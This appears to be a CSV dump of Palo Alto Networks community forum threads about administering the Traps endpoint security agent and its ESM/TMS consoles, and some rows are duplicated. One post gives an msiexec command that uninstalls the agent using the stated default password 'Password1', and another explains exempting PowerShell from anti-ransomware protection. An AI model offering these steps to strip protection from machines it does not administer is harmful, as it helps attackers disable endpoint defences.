304,258247,ancis,"@JasonFerrisThe agent does not log/record blocked network connections. The quota for the folder that the logs are stored in, is audited on an hourly base.",1,04-23-2019,07:19 AM
305,258247,JasonFerris,"@efrancisDoes this go the same for blocked processes? Xinetd being blocked, would that have generated a ton of logs that are sitting directly on the server? Also when you mention the quota for the folder that logs are stored in is audited hourly, does this mean there are logs on the server that do accumulate or do you mean they are purged to a point after reaching a max size of xGB?Thank you for the replies!",0,04-23-2019,07:48 AM
306,258247,ancis,"@JasonFerrisFirst, I would recommend to reach out to Palo Alto Endpoint support. They are a great team of engineers that can help determine any issues you may be facing. The quota part is for all of the Traps agent folders, which contains the logs. Normally the quarantine folder would the culprit of space being taken up. Again, the support team can help answer these questions, and are available for a remote session, if you think that will resolve the issue faster.",0,04-23-2019,08:10 AM
307,217502,hanslepire,"Hello,Have you resolve your issue ?I've the same problem, but with the 5.0.2 version...Thank youRegards",0,07-27-2018,06:39 AM
308,217502,abdul.altamimi,The issue was with the Mac Security tab. You need to go in and allow Traps.Thanks!Abdul,0,08-02-2018,01:46 PM
309,217502,Rahul001,"Already allowed inMac Security tab , But still same issueError- policy update failed error code- 307 and 94",0,04-17-2019,12:18 AM
310,217502,Rahul001,"Finally got the solution:Please check the uptime of Mac using uptime command on Mac terminal. you will surerly find that Mac haven't been rebooted since long. reboot Mac and allow in security Tab, Its done.If it help you out, please like and share your feedback.",1,04-19-2019,09:44 AM
311,251521,ancis,"@ZEBITI would highly recommend opening a case with Palo Alto Networks support. Who can help review the install logs, and troubleshoot with you.They also have the ability for a remote session to better understand the issue and offer resolve.",0,02-27-2019,05:05 AM
312,251521,RLI27,"We had installation problems with only one (the first one) of our 4 ESM servers. Always while upgrading (inplace) on this server we had to uninstall the old core version, before installing the new core version. Update was failing all the time.Now some weeks ago we installed the server OS from scratch. Since then we have done one update from V4.2.3 to V4.2.4 without any problem.So our workaround was uninstall/install instead of upgrading to new core versions. And the fix was complete new server OS installe from scratch - maybe we had some left overs on this ""early bird"" server that have caused the problems.HIH, cheers",0,04-09-2019,07:57 AM
313,242277,ancis,"Bstermer,It is recommended to speak with your sales engineer or open a support case with Palo Alto Network endpoint support. Either will be able to create the Feature Request, and provide a tracking number for the request.",0,12-21-2018,09:45 AM
314,242277,Bstermer,"Hello efrancis,Thank you for the reply. A support case has been opened for this request.Best regards.",0,12-21-2018,10:00 AM
315,242277,Bstermer,The feature request number for this is FR ID: 9283.If you have any questions you can reach out to your Sales Engineer and provide them with that FR ID number for status updates.,0,03-27-2019,10:51 AM
316,243724,Bstermer,"Hello,A support case has been opened to address this issue.Thank you.",0,12-21-2018,10:11 AM
317,243724,AbdulRahman_Safaria-labelwat,"Hello@Bstermer,Have got a reply from the TAC?If so, can you please share it.Thanks a lot",0,03-27-2019,04:05 AM
318,243724,Bstermer,"This is the reply I received:Thank you for contacting Palo Alto Networks Technical Support.At this time, our quarantine function will only isolate executable files. We do not have office file or DLL quarantining as an available function.If you wish to file a feature request, our recommendation would be to speak with your account team, so they can file the request and coordinate with product management for prioritization and any necessary roadmap conversations.I hope this clarifies, do you have any additional questions or concerns?",0,03-27-2019,10:46 AM
319,254828,marthasimons,,0,03-25-2019,07:03 AM
320,254828,ancis,"@Mohammad.QawasmehThe answer to your question is not very simple. There are several moving parts inline that could affect, and display the behavior you see. It would be recommendedto open a ticket with support, who can assist in analyzing the issue, and escalate if needed.",0,03-25-2019,07:13 AM
321,254828,marthasimons,Thanks,0,03-25-2019,07:14 AM
322,254828,BPry,"@Mohammad.Qawasmeh,What likely happend is local analysis analyzed the file due to WildFire not having a verdict for the file hash, and that analysis didn't show any problems. When that file was later uploaded to WildFire the sandbox environment recognized malicious activity and labeled it as malware. Due to the file already being allowed to run, the only thing you'll get is a notification saying that it allowed this to run.The good news is the hash is now known as malicious and it can't be run on any other device as long as they can check the hash verdict status with WildFire, so even though it allowed it on one machine it will block it going forward.",0,03-25-2019,07:15 AM
323,131943,JDominguez,"Hey Community,I need some help with a deployment architecture.For a small install (less than 1000 end points) can both the DB and the EMS Console&Server be hosted on a single virtualized server?Or should we deploy the solution with 2 dedicated servers:1x server = ECM Console and ECM Server on same machine1x database server = SQLite OR SQL 2014 – not sure which one?According to the below documentation, the install can be done using one server.https://www.paloaltonetworks.com/documentation/40/endpoint/endpoint-admin-guide/traps-deployment-sce...Any help/feedback is much appreciated.- JD",0,07-11-2017,12:20 PM
324,131943,Willian,"Hi@JDominguezBased on your description, there are two applicable options: Standalone Deployment and Small Single Site Deployment.Standalone DeploymentThis design is typically recommended forinitial proof of concept (POC) or a small site with fewer than 3000 Traps agents, use a standalone deployment to install the following Endpoint Security Manager (ESM) components on a single server or virtual machine:• ESM Server• ESM Console• Forensic (quarantine) folder• DatabaseI don't recommend to any of my customers to use this design in production, as it does not provide any redundancy for console or cores.Small Single Site DeploymentAs per the link you posted, and the official admin guide, this design requires:This is the minimal I always recommend to all my clients due to the redundancy aspects and flexibility.Now to your questions.My recommendation is that you adopt theSmall Single Site Deployment1 x ESM Console + Core (Combined)1 x ESM Core (Redundancy)1 x Database Server - Notice that SQLITE is no longer supported or recommended by Palo Alto even in POCs; hence, the official recommendation for environments with more than 250 endpoints is SQL Server Enterprise or SQL Server Standard as per the below screenshot.Important: You only can have one console installed.For further details on requirements please refer tothe following for the administrator guide: link:https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/technical-documentation/40/endpoin...I hope this helps.",2,07-13-2017,12:45 AM
325,131943,JDominguez,"Hi @Willian,The above helps alot! Thanks for the time and effort you put into your reply - it's much appreciated!I'm sure many more folks will be using this post for reference.Regards,Josh Dominguez",0,07-13-2017,07:04 AM
326,131943,ESutedy,"Hi,I cant seem to find a setting to change the date format from m/d/y to d/m/y.If the setting is not there, how do i make suggestion to PA to add these setting?Thanks",0,09-06-2017,06:12 PM
327,131943,MyBudget,"I logged the same request as a bug under 4.0.1 a while back and was advised that it would be addressed in a future version, so I expect that it is on a road-map somewhere.Much as I can work with m/d/y formatting, it's nice to have the d/m/y formatting that we are used to and have with our other products, like Windows, McAfee, SQL, Office, SAP, Exchange (ok - maybe not so much Exchange - backend Powershell prefers m/d/y).",0,10-12-2017,09:38 PM
328,254035,AbdulRahman_Safaria-labelwat,"Hello @TimNieIndeed Starting from Traps 5.0, it is moved to the cloud through TMS, instead of the on-premise ESM, that is why you can't see any files for downloading on the portal, as the management is on the cloud, and the agents are downloaded from TMS too.",1,03-18-2019,02:30 AM
329,254035,TimNie,"Hi,thanks for your answer.But I have one more question:Does this mean that the development of the ESM is stopped, and we will have to migrate to Traps Management Service?Or will there be future updates for ESM and Traps 4.x so that we can keep our existing environment?",0,03-22-2019,12:31 AM
330,254035,ancis,@TimNieThe ESM 4.x branch will continue to be supported until EOL.,0,03-22-2019,03:13 PM
331,254053,sbecher11,"I am also interested in this, especially in the second part. We have a customer who has hosts that cannot ever be connected to the internet, is it not possible to secure these via TMS and manual updates?",0,03-20-2019,01:01 AM
332,254053,BPry,"@RamBalaji,From my understanding the heartbeat connection will trigger a policy update if one is available, similarly if a new content upgrade has been pushed out the next heartbeat connection will trigger the content upgrade. Content upgrades actually being pushed to the TMS tenant are done in a phased approach and don't have a set schedule really.If you are utilizing the TMS you can not perform a manual content upgrade on the endpoint at this time. Your agentneeds to have internet access to TMS to be able to download the new policies, new content upgrades, and to verify license status.",0,03-20-2019,08:39 AM
333,254053,BPry,"@sbecher11,If the hosts can not be granted access to the TMS tenant TMS is not going to be the proper Traps deployment for you. TMS access is required for agent activation, policy updates, content upgrades, and everything else.In your situation I would recommend that you deploy Traps with an on-site ESM server that you can grant access to the outside world. Then the hosts only need access to the ESM server and don't actually require internet access.Note:The Traps Management Service (Cloud/Hosted) environment and the Traps Endpoint Security Manager server (ESM) are both supported. Prior to deployment you should ensure that the install solution meets all of your needs; there are some things that are only going to be available in the ESM installation, along with features that come to TMS prior to actually being deployed in a ESM upgrade.",0,03-20-2019,08:44 AM
334,254087,BPry,"@m.hassan96,ESM will handle things perfectly fine without Active Directory.",1,03-18-2019,12:08 PM
335,254087,AbdulRahman_Safaria-labelwat,"Hello @m.hassan96,Active Directory is not a requirement for Traps deployment, and Traps will work fine without it.Active Directory can be integrated with Traps to authenticate ESM Administrators, and to use Active Directory objects, and also it will make it easier for big environments to push the certificates through a GPO if SSL is being used.But still it is not a requirement.",1,03-18-2019,12:13 PM
336,254087,m.hassan96,"@BPry,@AbdulRahman_Safwat Thanks for your replies. So I just need to Configure ESM , install Trap Agents on Workload VMs and specify IP of ESM server and thats it. Agents will be able to pull updates and security policies from ESM server on that IP address, no furthur configuration or authentication is required. Is that right? Kindly correct me if I'm wrong",0,03-18-2019,12:21 PM
337,254087,BPry,"@m.hassan96,Correct. When you install the ESM you'll ideally specify a certificate signed by a trusted CA so that the Client and the server can securely determine whether or not they trust each other; the Server itself will need to be allowed access to the outside to pull the updates, but the agents themselves will pull the updates from the ESM on port 2125 (by default).",0,03-18-2019,12:27 PM
338,254087,m.hassan96,"@BPryThanks that helped a lot. Just to make things more clear, What If we don't use any kind of certificates? I'm assuming Communication between Agents and ESM server would still happen but it would be less secure (no encryption). Is that right?",0,03-18-2019,12:42 PM
339,254073,AbdulRahman_Safaria-labelwat,"Hello @sbecher11,The compatability matrix is always up to date, so once there are changes, or new OS is added, you will find it on the same link.Or it will be announced in the release notes too.",0,03-18-2019,09:00 AM
340,253329,ancis,"@AbdulRahman_SafwatI would recommend double check all of your settings on the settings tab. Pay close attention to the ""Update From Server Package Address:"" setting. Also, this seems like an issue that the Palo Alto Networks Endpoint Support team can help tackle on a remote session.",0,03-12-2019,06:34 AM
341,227064,BPry,"@ocontreras,You should be working with a partner from who you got the licenses to begin with to get a renewal setup. If you have since sepperated from that vendor you can reach out to sales@paloaltonetworks.com and they can get someone to help you get the request processed.",0,08-14-2018,12:05 PM
342,227064,ManagerIT,https://docs.paloaltonetworks.com/traps/4-2/traps-endpoint-security-manager-admin/set-up-the-traps-i...,0,02-05-2019,03:14 AM
343,227064,skucukgul,"Hi all,Could you please explain what will happen if esm license expired? Which features we can use or which one we can not use it? Our Esm version is 4.2.3.Thanks for your replyRegards",0,03-10-2019,12:25 AM
344,227064,BPry,"@skucukgul,If memory serves correctly the ESM admin page becomes almost unusable as most of the tabs become inaccessible; you'll only be able to go to the system page to few the information required to get the ESM licensed again and input the new license.The Traps agents when they go into an unlicensed state likewise switch to a disabled function, similar to if you stopped all of the cyveraprocesses.",0,03-10-2019,08:21 AM
345,227064,skucukgul,"Hi@BPrySo all malware and exploit protection features will be unusable after license expired, do I understand it correctly?Is there any documents about this license situation?Thanks",1,03-10-2019,02:58 PM
346,252704,ancis,"@StPatrickwhat version are you upgrading from, and to?",0,03-07-2019,07:37 AM
347,252704,ancis,"@StPatrickhttps://docs.paloaltonetworks.com/traps/4-2/traps-endpoint-security-manager-new-features/upgradedown...Depending on the versions, please refrence this note:Traps 4.1.5-h1 is a hotfix release to support macOS 10.14 and does not contain any updates for Windows agents. To upgrade Windows agents to Traps 4.2.1, you must first upgrade the Traps agents to the non-hotfix release packageClientUpgradePackage-4.1.5.37365.zip(release date: 07/28/2018) or to the 4.2.0 release using the upgrade packageClientUpgradePackage-4.2.0.36348.zip(release date: 06/25/2018).",1,03-07-2019,07:39 AM
348,252704,StPatrick,That's exactly it. Really appreciate the prompt repy efrancis,0,03-07-2019,07:44 AM
349,252704,ancis,"Glad you got it working, post questions or concerns anytime!",0,03-07-2019,08:01 AM
350,252682,BPry,"@BigPalo,If the file is in a set location you could simply whitelist the file itself via the file path, or if this is an in-house application EXE/DLL file you could have your developers sign the application so you can whitelist it based off of the signing certificate.",0,03-07-2019,06:38 AM
351,252682,BigPalo,"How can we do that: If the file is in a set location you could simply whitelist the file itself via the file path?The issue is that, WF lasts 10 minutes in permit the access to this file, so end-users first receive denied access, and then in 10 minutes end-user can open the file. But all en users open a ticket about this issue.",0,03-07-2019,06:43 AM
352,252682,BPry,"@BigPalo,Directions differ based on the version of Traps you are using. Are you using the hosted Traps Management Service or are you still running the on-site Endpoint Security Manager?",0,03-07-2019,06:45 AM
353,252682,ancis,"If the file name changes, you can whitelist the file path (with env. varablies if needed), and use a wildcard (*) for the file name. If the file name does not change, it would be advised to include the file name.",0,03-07-2019,06:46 AM
354,252682,BigPalo,"FIle name is the same, but the hashes are diferent. So can we create a white list for this filename?",0,03-07-2019,06:50 AM
355,252682,BPry,"@BigPalo,You can easily whitelist the file name; to give you directions on how to do so we need to know what Traps installation you are utilizing as the instructions will be different between TMS and ESM installations.",0,03-07-2019,06:51 AM
356,252682,BigPalo,Im almost sure that is ESM 4.x version.,0,03-07-2019,06:58 AM
357,252682,ancis,https://docs.paloaltonetworks.com/traps/4-1/traps-endpoint-security-manager-admin/malware-protection...,0,03-07-2019,07:20 AM
358,252682,BigPalo,OR this global rule?https://docs.paloaltonetworks.com/traps/4-1/traps-endpoint-security-manager-admin/getting-started-wi...,0,03-07-2019,07:24 AM
359,214560,BPry,"@BizBo,I believe that whitelisting folders is only going to stop Traps from scanning within that folder (ex: C:\windows.old) not specific files. Not sure that Traps 5 has this feature just yet.",0,05-23-2018,08:51 AM
360,214560,BizBo,"@BPrymany thanks I figured this out, I am guessing Traps 5 will only get better as right now it seems to basic functions.Darren",0,05-24-2018,12:12 AM
361,214560,BPry,"@BizBo,From Ignite this week it's clear that while Traps 5.0 and the online functionality is the 'future', it's likely recommended that you stay with Traps 4.1 on-site for the time being. That being said I did get confirmation that Traps will see updates monthly and a new 'feature heavy' update will be released twice a year. So it's comforting to know that theyknow they still have plenty of features to add yet.",0,05-24-2018,04:44 PM
362,214560,BizBo,"This has to be the way, as other brands are now working towards anti-exploit and a cloud-basedhosting. We moved to 5 as we were hosting our ESM in Azure and I wanted toshut that down due to costs.But I am encourage by your feedback@BPryD.",0,05-24-2018,11:44 PM
363,214560,tsecmonkey,"Hi,The only optionavailable forexclusions in the scheduled scan is folders. It does notprovide an option to specifyfiles.Has anyone found a way to prevent the agent from scanning these files on the endpointsyet?Thanks.",0,03-01-2019,06:18 AM
364,249694,ancis,"Expo-Ant,The compatibilitymatrix is up to date an accurate. Please check the compatibilitymatrix with every version upgrade, as even maintenanceupgrade can affect the supported Operating systems that are compatible with Traps.",0,02-22-2019,05:17 AM
365,249694,AbdulRahman_Safaria-labelwat,"Hi @AntFreer ,I have tested Linux Ubuntu 18.4.1 in my environment with an agent 4.2.2, and it is showing Status: Running, so I guess it is compatible, as it did not show ""Incompatible"" status or errors.Hope this can help.Regards",0,02-24-2019,07:14 AM
366,249694,AbdulRahman_Safaria-labelwat,"Hi@AntFreer,They have just release Traps 6.0, andsimultaneously updated the Matrix, and it is showing that Ubuntu Server 18 is not supported at 4.2, it is only supported at 6.0, so officially it is not supported.",0,02-26-2019,09:51 PM
367,250913,AbdulRahman_Safaria-labelwat,"Hi@LukeBullimore,I have just faced the same error with agent 5.0.5, but the endpoint had a third party antivirus, so I tried uninstalling the third party antivirus, then uninstall traps agent and install it again and it worked fine, and on another machine I did the same but the error was still happening so I tried downloading the agent file again and install traps and it worked again, probably the file go corrupted, so you can try both workarounds if appliacable, also please provide the status from the TMS, it is most probably unauthorized or unlicensed, also confirm that you have enough licenses., also make sure the connectivity is ok.Regards",0,02-22-2019,06:53 AM
368,250913,ancis,"LukeBullimore,Was the originalinstaller deleted from the TMS? This error normally comes up when that is the case. I would recommend to create a new installer in the TMS, download it, and install it.If the issue continues, open a case with Palo Alto Networks support to investigate further. Also, double check hardware and firmware for compatibility.",1,02-22-2019,06:54 AM
369,250913,LukeBullimore,"Hey@AbdulRahman_SafwatThe machine doesn't have another AV and I probably should have mentioned that we already tried a re-install to no avail! 😞Thanks,Luke.",0,02-22-2019,08:15 AM
370,250913,LukeBullimore,"Hey@efrancisThis sounds really interesting, I'll give that a go and will let you know!Thanks,Luke.",0,02-22-2019,08:16 AM
371,250913,ancis,"Luke,Was a new installer created before the re-install attempt? If yes, I would recommend to reach out directly to support.",0,02-22-2019,08:17 AM
372,249534,AbdulRahman_Safaria-labelwat,"The issue was resolved after upgraing the MacOS to the latest update, I guess some old versions have compatability issues.",0,02-22-2019,03:30 AM
373,247108,AbdulRahman_Safaria-labelwat,"Hello@FaacSI,I beleive you meant to say version 4.2.2.39637.Indeed this is a bug in 4.2.2, and it is now resolved in 4.2.3 which was released today, the bug detail from 4.2.3 release notes is as follow:CYV-14380 Fixed an issue where you could not uninstall Traps despite having administrative privileges through fully enabled User Account Control (UAC). Now, the uninstaller evaluates UAC access when it performs a self-security validation step to ensure the uninstall command was initiated by an administrator with the necessary permissions.",1,01-29-2019,07:07 AM
374,131943,JDominguez,"Hey Community,I need some help with a deployment architecture.For a small install (less than 1000 end points) can both the DB and the EMS Console&Server be hosted on a single virtualized server?Or should we deploy the solution with 2 dedicated servers:1x server = ECM Console and ECM Server on same machine1x database server = SQLite OR SQL 2014 – not sure which one?According to the below documentation, the install can be done using one server.https://www.paloaltonetworks.com/documentation/40/endpoint/endpoint-admin-guide/traps-deployment-sce...Any help/feedback is much appreciated.- JD",0,07-11-2017,12:20 PM
375,131943,Willian,"Hi@JDominguezBased on your description, there are two applicable options: Standalone Deployment and Small Single Site Deployment.Standalone DeploymentThis design is typically recommended forinitial proof of concept (POC) or a small site with fewer than 3000 Traps agents, use a standalone deployment to install the following Endpoint Security Manager (ESM) components on a single server or virtual machine:• ESM Server• ESM Console• Forensic (quarantine) folder• DatabaseI don't recommend to any of my customers to use this design in production, as it does not provide any redundancy for console or cores.Small Single Site DeploymentAs per the link you posted, and the official admin guide, this design requires:This is the minimal I always recommend to all my clients due to the redundancy aspects and flexibility.Now to your questions.My recommendation is that you adopt theSmall Single Site Deployment1 x ESM Console + Core (Combined)1 x ESM Core (Redundancy)1 x Database Server - Notice that SQLITE is no longer supported or recommended by Palo Alto even in POCs; hence, the official recommendation for environments with more than 250 endpoints is SQL Server Enterprise or SQL Server Standard as per the below screenshot.Important: You only can have one console installed.For further details on requirements please refer tothe following for the administrator guide: link:https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/technical-documentation/40/endpoin...I hope this helps.",2,07-13-2017,12:45 AM
376,131943,JDominguez,"Hi @Willian,The above helps alot! Thanks for the time and effort you put into your reply - it's much appreciated!I'm sure many more folks will be using this post for reference.Regards,Josh Dominguez",0,07-13-2017,07:04 AM
377,131943,ESutedy,"Hi,I cant seem to find a setting to change the date format from m/d/y to d/m/y.If the setting is not there, how do i make suggestion to PA to add these setting?Thanks",0,09-06-2017,06:12 PM
378,131943,MyBudget,"I logged the same request as a bug under 4.0.1 a while back and was advised that it would be addressed in a future version, so I expect that it is on a road-map somewhere.Much as I can work with m/d/y formatting, it's nice to have the d/m/y formatting that we are used to and have with our other products, like Windows, McAfee, SQL, Office, SAP, Exchange (ok - maybe not so much Exchange - backend Powershell prefers m/d/y).",0,10-12-2017,09:38 PM
379,240698,Meteo-Admin,With the January release and the client 5.0.5 seems the problems where be solved. Now I wonder why no one else had the same problems?,0,01-21-2019,08:33 AM
380,240698,FaacSI,"sorry for asking: if i understand correctly you have installed the ""on-premises"" ESM server, which is still at 4.2.2 version.Are you using it with 5.x agent version? Is it possible/supported?I'm still with the on-prem ESM solution, but i still deploy agents in the same version the esm is.",0,01-23-2019,01:43 AM
381,240698,MeteoAdmin,"No, we using since last year the Traps Management Serviceinstead""on-premises"" ESM server",0,01-23-2019,02:49 AM
382,240698,FaacSI,"oh i see.honestly, i have updated many times che ESM and never had a single issue other than the impossobility to uninstall with from the client using the pass",0,01-23-2019,04:57 AM
383,240698,tobar,"Hello!The uninstall password and change uninstall password are bug since traps 4.1.2 if I remember well, Thast´s looks like in the version 4.2 that will fixed, according your experience it's not. Anyway, one solution for tat issue (temporary until the bug is fixed) is:1. Open a cmd console with administrator rights2. move to path where your installer3. run the command:msiexec /accepeula /x Path\Traps_x64_4.1.1.28779.msi UNINSTALL_PASSWORD=Password1 /l*v c:\uninstallLogFile.txtNOTE: By default the uninstall password is: Password1.Using a Uninstall Policy with Password1 wolud works fine.The version 5.x its not the same that 4.x, from the behavior to the policies, all are different, the protection is different too.I use both, ESM based for all mi internal clients and TMS for movil users, some linux and MAC.For my personal use (for me only) the upgrade of all clients (using ESM) I prefer make it computer to computer, because one latency on the network, computer freeze, hibernation, laptop close or whatever thing could stop the installation/unistallation/upgrade and damage the agent.I hope that help to you.Regards,wtobar",1,01-23-2019,06:41 AM
384,245300,BPry,"@ErrantOsi,This is either an all or nothing thing, you can't exclude just Powershell for randsomware protection.",0,01-09-2019,09:05 AM
385,245300,briancaw,"Hi@ErrantOsiYou can actuallywhitelista specific application from the Anti-Ransomware module in Trapsin the Exceptions page in TMSOnce you login to the TMS console- go to Exceptions -> Process Exceptions- click on Actions button on the upper right area of the page and select Create Process Exceptions- enter the Process name, in your example, powershell.exe- select the Platform Windows- under Module, select Anti-Ransomware- click on CreateOnce created, edit the exception to add your target agents/groups you want this exception to be applied to.Let me know if this helps.",3,01-09-2019,09:18 AM
386,245300,BPry,"@briancaw,Never knew you could do that. Not sure why you would want to, but good to know the option exists.",2,01-09-2019,11:20 AM
387,245300,ErrantOsi,"An Italian would say ""perfetto"" 🙂 Thanks!",0,01-11-2019,12:35 AM
388,245253,AbdulRahman_Safaria-labelwat,I have just tested on ESM 4.1.4 and the same behaviour is there.,0,01-08-2019,11:53 PM
389,245253,briancaw,"hi@AbdulRahman_SafwatThis is indeed an expected behavior as you said, to prevent files from getting quarantined again after restoration.We will review our documentation and correct it as needed tobetter clarify this behavior.Thanks!",1,01-09-2019,09:27 AM
390,137380,mmoshiri,"Hi Tim,Traps can actually relay its logs via syslog protocol to any SIEM that can ingest the data. Look under theSettings tab of the ESM, then click on theSyslog item in the list..The Panorama integration is something our teams are working on. I don't have much information on that to share at the moment...",1,01-13-2017,08:25 AM
391,137380,MichaelMelone,I have to add that I would like to see this too. A feature in traps I would like to see is simlar to sysmon. It would be nice to use the Traps Console to get visibility into any processes and services running on a specific endpoint and being able to long certain activites directly from the endpoint to the siem.  Similar to ideas stated here in this slide deck from RSAcon. I know we can do a data retrieval but that process is not very intuitive and is not in real time.,0,01-30-2017,12:24 PM
392,137380,mpgioia,"And the secure syslog option... where's the cert steps/setup to load a cert like PAN-OS doc shows here, for example, ?https://docs.paloaltonetworks.com/pan-os/8-1/pan-os-admin/monitoring/use-syslog-for-monitoring/confi...",0,01-08-2019,02:36 PM
393,244225,kiwi,"@BigPalo,I think this is better suited in the Traps discussions (moving it there).Cheers !-Kiwi.",0,12-24-2018,03:42 AM
394,244225,BPry,"@BigPalo,So the first bit of your logs is specific to it building the policy trees and such, this is expected. The only part here that would really worry me is that it seems to be failing to start the Cyvera processes, which is what Traps depends on. Go into your services and see if you can't manually start the Traps service.",0,12-24-2018,12:31 PM
395,244225,BigPalo,we tried but the services are blocked even with user administrator. We can not do anything.,0,12-26-2018,12:29 AM
396,244225,BPry,"@BigPalo,You need an account that actually has the priveleges necissary to start services. I'm guessing that this could also be your issue with the client; while you have permissions to install a program, your account doesn't have the necissary permissions to actually modify the registry or start services.",0,12-27-2018,09:15 AM
397,242694,ancis,"Sandeep,It would be advised that you reach out to Palo Alto Network Endpoint Support. They can help you deep dive into the issue for better understanding and assist with the resolution.",0,12-10-2018,05:15 AM
398,242694,Sandeep_R,"Hello ,I could able to test the installation of Traps agent on endpoint with SecureBoot enabled. I could install it without any hassle. Also I verified disabling it and install, I did not find any difference.Also I verified enabling and disabling Driver Signing Enforcement and install the agent. I could able to install the agent and it is communicating with the ESM server.Below is the screenshot for the same.installation traps agent with Secure Boot enabledMay be the issue was with one perticular endpoint. Couldnt really get the root cause.Thankyou..RegardsSandeep",0,12-17-2018,04:19 AM
399,239869,ancis,"Marivi,Are you asking about automated reporting?",0,11-21-2018,05:56 AM
400,239869,mbanica,you can check the link below for the cloud service availability.once registered you can get an email when there is a maintanancehttps://status.paloaltonetworks.com/,0,12-11-2018,01:50 AM
401,241425,ancis,"Sandeep,It looks like your customer is running into Service protection. This is the software's function to protect itself. You can recommend to exclude the traps directories or turn service protection off on the machines that are part of the replication process.",0,11-28-2018,05:05 AM
402,241425,Sandeep_R,"Hiefrancis,Thank you for the response. Your suggestion solved the issue.",1,12-10-2018,02:02 AM
403,242248,ancis,"Jnaranjo-I apologizeI answered your other question with this questions answer (ivefixed that).The On-Prem solution (ESM) and the Cloud-based solution (TMS) do not have the ability for their agents to work with the opposite. Meaning, if an agent is installed and configured to work with the ESM, it will not work with TMS, the reverse is also true.",1,12-05-2018,08:48 AM
404,242254,ancis,"Jnaranjo-Yes, you can do URL filtering on the firewall. You can then limit the URL to only the Wildfire cloud you choose to connect to.",1,12-05-2018,08:46 AM
405,240266,Hodor,Have you also tried to start a CMD with administrative privileges and call the Traps-MSI with the uninstall parameter?,0,11-27-2018,05:20 AM
406,240266,ancis,"@Hodoris correct.""Have you also tried to start a CMD withadministrative privileges and call the Traps-MSI with the uninstall parameter?""You will also have the option to bake in the uninstall password into the string. If needed, Please reach out to Palo Alto Networks Support who would be happy to assist you through the uninstall workaround.",1,11-27-2018,05:23 AM
407,240745,BPry,"@jnaranjo,The bigger thing here would be if you're violating any licensing aggrements or not, that would be a question for your account team. However, you can certaintly do this with the TMS or the on-site EMS servers by seperating different clients into different groups.",0,11-21-2018,08:50 AM
408,240745,MarcinSt,"Hello.@BPrycome on, be serious 😉 How practically would you like to create these groups of clients? Based on what? Their IP addresses, names of computers or domain/workgroup they belong to? Each of these parameters and even all of them together don't make client unique.IMHO TMS and ESM are far-far away from multitenancy what really worries me. 😕All the best 🙂",0,11-21-2018,09:47 AM
409,240745,BPry,"@MarcinSt,That's actually exactly how I would do it; but to be honest I'd probably make a new TMS instance for each client, because again I really doubt the licensing aggrements actually allow for the re-selling of Traps like this.In most instances where I was managing the environment I would have a few things to trigger on here.1) Clients usually have there own unique IP scheme that doesn't overlap, as it makes my life easier.2) Domain identification is easy with the tools that Palo Alto gives you; I don't have to worry about workgroups.3) Hostnames should be usable as they should follow some sort of naming scheme; and then you would just build a dynamic endpoint group.If we're talking about really small clients here it doesn't sound like you have anything that could be used to easily sperate them, and from that aspect I would argue that you should still seperate the instances as a best practice. Because of the information that Traps captures as a client I wouldn't really be that happy with sharing an instance with any other company; on the off chance they force you to give them access so they can manage their own policies.",1,11-21-2018,10:03 AM
410,240745,ancis,I agree with@BPryvirtual groups would allow you to accomplish what you desire in a single instance but would be cumbersome to administrate.,0,11-21-2018,10:08 AM
411,238823,ancis,AbdulRahmanSafwatThis is a known issue that is resolved in 4.2.2.,0,11-07-2018,05:15 AM
412,238823,AbdulRahman_Safaria-labelwat,"Hi@efrancisThanks a lot for your reply, can you just tell me the issue's refrence number.Thanks",0,11-07-2018,05:28 AM
413,238823,ancis,"AbdulRahmanSafwat,Unfortunately,you will need to contact Palo Networks Support. They should have no issue providing you the referencenumbers, and describe the known workaround.",0,11-07-2018,05:30 AM
414,214161,ElasticSkyX,"Hi there,First thing to confirm: are you running the TrapsVDITool from the client where you created the files signatures from?The tool needs to verify the existence of the files and if it cannot “see” any of the files then it reports an error when validating the CSV. I use a bit of PowerShell to modify the CSV to have UNC paths so I can run the verdicting from a machine with the Traps agent installed (also a requirement but the agent needs to be stopped).Sorry if this is covering old ground but worth asking and verifying before suggesting other things 😉Kind regards.",0,05-18-2018,10:31 PM
415,214161,ATB-Adm,"Hi Glen,yes, we're running the Tool inside the client, where the signatures are created.",0,05-30-2018,04:00 AM
416,214161,ElasticSkyX,"Hi there,The error you are getting is indicating that the tool cannot verify any of the files in the CSV. It does this by confirming the files exist.We could try one thing before looking at other options but could you confirm that you are running TrapsVdiTool with the ""Run as administrator"" option? You should get a different error (Required registry access is not allowed) if this was the case but would like to confirm 🙂After that lets try something really simple. On the client you are verdicting, put the sigcheck64.exe binary in a folder and just create the CSV for just this one file. Once created run the TrapVdiTool to verdict just this one file.Let us know how this goes,Kind regards.",0,05-30-2018,01:06 PM
417,214161,ATB-Adm,"Hi Glen,we tried running the TrapsVDITool with the ""Run as administrator"" option, same result, ""Parsing failed"".We also tried checking only the sigcheck64.exe and uploading the CSV file, also same result, ""Parsing failed""😞",0,05-31-2018,01:11 AM
418,214161,ElasticSkyX,Could you confirm the switches that you used on sigcheck when creating the hashes?Kind regards.,0,05-31-2018,04:48 AM
419,214161,ATB-Adm,"Hi Glen,we used the cmd switches described in the PaloAlto Traps 4.1 Administrator Guide.sigcheck /s /c /e /h C:\ > C:\temp\outfilename.csv orsigcheck /s /c /e /h C:\sigcheck\sigcheck64.exe > C:\temp\outfilename.csv",0,06-04-2018,01:06 AM
420,214161,ElasticSkyX,Could I be as bold to ask if you could upload the output file here? Just the one which has the sigcheck hashes contained in it.Kind regards.,0,06-04-2018,01:34 AM
421,214161,ATB-Adm,"Hi Glen,I'm really sorry for the long waiting time, we got really important steps to do till today.We upgraded to Traps 4.2.1 but the issue remains the same.I upload the .csv file here now.",0,09-17-2018,04:49 AM
422,214161,ElasticSkyX,"Hi there,Sorry tried to download the file but it doesn't appear to be available. Yes I know I was slow answering this thread and apologise for that 🙂Kind regards.",0,10-28-2018,07:47 PM
423,131943,JDominguez,"Hey Community,I need some help with a deployment architecture.For a small install (less than 1000 end points) can both the DB and the EMS Console&Server be hosted on a single virtualized server?Or should we deploy the solution with 2 dedicated servers:1x server = ECM Console and ECM Server on same machine1x database server = SQLite OR SQL 2014 – not sure which one?According to the below documentation, the install can be done using one server.https://www.paloaltonetworks.com/documentation/40/endpoint/endpoint-admin-guide/traps-deployment-sce...Any help/feedback is much appreciated.- JD",0,07-11-2017,12:20 PM
